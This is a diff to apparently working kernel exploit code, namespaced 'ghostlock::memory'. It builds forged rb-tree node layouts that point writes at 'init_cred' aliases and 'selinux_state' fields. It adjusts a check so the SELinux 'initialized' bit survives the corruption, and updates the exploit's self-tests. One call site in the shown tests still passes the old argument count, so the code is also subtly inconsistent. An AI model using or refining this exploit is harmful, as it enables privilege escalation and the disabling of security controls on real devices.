@@ -83,7 +83,7 @@ namespace ghostlock::memory {
     PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
-        uintptr_t init_cred_alias) {
+        uintptr_t init_cred_alias, uintptr_t zero_value_override) {
         PayloadWriteLayout layout = {
             .fops = default_fops,
         };
@@ -92,7 +92,8 @@ namespace ghostlock::memory {
         if (request->preserve_child) {
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
-                               : page_base + 0x100;
+                               : (zero_value_override ? zero_value_override
+                                                      : page_base + 0x100);
             /* the erase stores at rb_left, and the collateral re-parents through
              * this same value -- see waiter_tree_stamp */
             layout.left = request->target;
@@ -133,13 +134,18 @@ namespace ghostlock::memory {
     }
 
     int32_t payload_write_layout_accepts_page(
-        const WriteRequest *request, const PayloadWriteLayout *layout) {
+        const WriteRequest *request, const PayloadWriteLayout *layout,
+        uint32_t initialized_offset) {
         if (!payload_write_layout_matches_request(request, layout)) return 0;
-        /* W1 stores its page-derived value across selinux_state fields. An even
-     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
-        if (request->mode == WriteMode::Zero && request->preserve_child &&
-            ((layout->right >> 16) & 1) == 0)
-            return 0;
+        /* W1 stores its value across selinux_state fields. The kernel tests
+         * bit 0 of `initialized` (a `_Bool` load compiled as `ldarb; tbnz #0`),
+         * so an even byte reads as false and breaks every subsequent SID
+         * lookup. Which byte it is depends on the family. */
+        if (request->mode == WriteMode::Zero && request->preserve_child) {
+            if (initialized_offset >= sizeof(uintptr_t)) return 0; /* fail closed */
+            const uint32_t shift = 8U * initialized_offset;
+            if (((layout->right >> shift) & 0x1U) == 0) return 0;
+        }
         return 1;
     }
 
@@ -191,7 +197,7 @@ namespace ghostlock::memory {
                 load64(current.data(), 0x20) != 0 ||
                 load64(current.data(), 0x28) != vectors[i].expected_left ||
                 !payload_write_layout_matches_request(&request, &layout) ||
-                !payload_write_layout_accepts_page(&request, &layout))
+                !payload_write_layout_accepts_page(&request, &layout, 2))
                 return 0;
         }
         /* The invariant the vehicle rests on: a zero write's node is CHILDLESS and
@@ -213,7 +219,7 @@ namespace ghostlock::memory {
             0xffffff8000124000ULL, WriteMode::Zero, false);
         PayloadWriteLayout rejected = payload_write_layout(
             &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
-        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
+        if (payload_write_layout_accepts_page(&w1, &rejected, 2)) return 0;
         rejected.right = 0;
         if (payload_write_layout_matches_request(&w1, &rejected)) return 0;
 
